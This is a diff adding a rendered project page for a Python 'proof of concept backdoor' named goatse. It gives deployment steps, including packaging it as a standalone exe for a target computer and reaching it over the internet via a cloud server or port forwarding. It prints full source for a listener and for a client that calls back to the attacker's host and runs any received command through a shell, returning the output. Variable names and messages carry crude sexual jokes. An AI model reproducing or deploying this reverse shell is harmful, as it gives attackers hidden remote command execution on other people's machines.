@@ -1,0 +1,83 @@
+I"&<h1 id="goatse">goatse</h1>
+<p>a proof of concept backdoor for the most bare-bone access</p>
+
+<h2 id="usage">Usage</h2>
+<p>Run the server.py on your computer to start listening for callbacks.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo chmod </span>775 server.py
+<span class="nv">$ </span>./server.py
+</code></pre></div></div>
+
+<p>3 ways you can start goatse to target computer</p>
+<ol>
+  <li>run as python script
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo chmod </span>775 goatse.py
+<span class="nv">$ </span>./goatse.py
+</code></pre></div>    </div>
+  </li>
+  <li>create an exe file using pyinstaller, exe file is located in dist folder
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ pyinstaller --onefile goatse.py
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="how-does-it-work">How does it work?</h2>
+<p>server.py</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1">#import socket API module
+</span><span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># for LAN you can use your pc's ip.
+# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc's ip address.
+</span><span class="n">serverIp</span> <span class="o">=</span> <span class="s">'192.168.1.1'</span>
+<span class="n">serverPort</span> <span class="o">=</span> <span class="mi">8080</span> 
+<span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">server</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">serverIp</span><span class="p">,</span> <span class="n">serverPort</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Server is online'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Listening for callback'</span><span class="p">)</span>
+
+<span class="c1">#listening for callback
+</span><span class="n">server</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">target</span><span class="p">,</span> <span class="n">target_addr</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
+
+<span class="c1">#will display once callback is initiated
+</span><span class="k">print</span><span class="p">(</span><span class="s">f'[+] </span><span class="si">{</span><span class="n">target_addr</span><span class="si">}</span><span class="s"> She spreads the legs, it is time'</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+<p>goatse.py</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1">#import socket and subprocess modules, subprocess module allows us to run commands on our target machine.
+</span><span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+
+<span class="c1">#don't forget to set the correct server ip address and port in order for this to callback home.
+</span><span class="n">serverIp</span> <span class="o">=</span> <span class="s">'192.168.1.1'</span>
+<span class="n">serverPort</span> <span class="o">=</span> <span class="mi">8080</span>
+<span class="n">backdoor</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">backdoor</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">serverIp</span><span class="p">,</span> <span class="n">serverPort</span><span class="p">))</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="c1">#after successfull callback to home, goatse will start to listen for commands from server
+</span>    <span class="n">anal</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    
+    <span class="c1">#this decodes the user command from sent from server
+</span>    <span class="n">anal</span> <span class="o">=</span> <span class="n">anal</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">UserInput</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">anal</span><span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
+    
+    <span class="c1">#then executes command and read the output/error
+</span>    <span class="n">output</span> <span class="o">=</span> <span class="n">UserInput</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">output_error</span> <span class="o">=</span> <span class="n">UserInput</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">backdoor</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">output_error</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="license">License</h2>
+<p><a href="https://choosealicense.com/licenses/bsd-3-clause/">BSD 3-Clause “New” or “Revised” License</a></p>
+
+<h3 id="resources">Resources:</h3>
+<p><a href="https://github.com/AdrianDucao/goatse">Github Repo</a></p>
+
+<p>Happy Coding.</p>
+:ET
